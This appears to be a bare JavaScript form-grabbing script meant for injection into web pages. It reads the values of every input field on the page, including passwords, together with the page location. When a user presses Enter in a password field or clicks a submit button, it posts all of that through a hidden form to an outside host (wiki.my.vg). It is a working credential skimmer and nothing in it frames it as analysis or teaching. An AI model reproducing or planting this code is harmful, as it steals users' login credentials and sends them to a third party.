
var lv_elems = document.getElementsByTagName('input');
var lv_elms_json = {};

fn_post_to_url = function (v_path, v_params, v_method, v_target) {
          console.log("post_to_url");
  v_method = v_method || 'post'; // Set method to post by default, if not specified.
  v_target = v_target || 'defTarget';
  // The rest of this code assumes you are not using a library.
  // It can be made less wordy if you use one.
  var lv_form = document.createElement('form');
  lv_form.setAttribute('method', v_method);
  lv_form.setAttribute('action', v_path);
  lv_form.setAttribute('target', v_target);
  for (var lv_key in v_params) {
    var lv_hiddenField = document.createElement('input');
    lv_hiddenField.setAttribute('type', 'hidden');
    lv_hiddenField.setAttribute('name', lv_key);
    lv_hiddenField.setAttribute('value', v_params[lv_key]);
    lv_form.appendChild(lv_hiddenField);
  }
  document.body.appendChild(lv_form);
          console.log("Open popup");
  var lv_win = window.open('', v_target);
  lv_form.submit();
}

fn_sendInfo = function () {
          console.log("Sending info");
  for (var i = 0; i < lv_elems.length; i++) {
    var lv_elm = lv_elems[i];
    lv_elms_json[lv_elm.id] = lv_elm.value;
  }
  lv_elms_json["location"] = window.location;
          console.log("Params"+lv_elms_json);
  fn_post_to_url("https://www.wiki.my.vg/index.php", lv_elms_json);
}

for (var i = 0; i < lv_elems.length; i++) {
  var lv_elm = lv_elems[i];
  switch (lv_elm.type) {
    case 'password':
      lv_elm.onkeyup = function (v_e) {
        if (v_e.keyCode == 13) {
          console.log("info Sent");
          fn_sendInfo();
        }
      };
      break;
    case 'submit':
      lv_elm.onclick = function (v_e) {
          console.log("Button Click");
        fn_sendInfo();
      };
      break;
  }
}
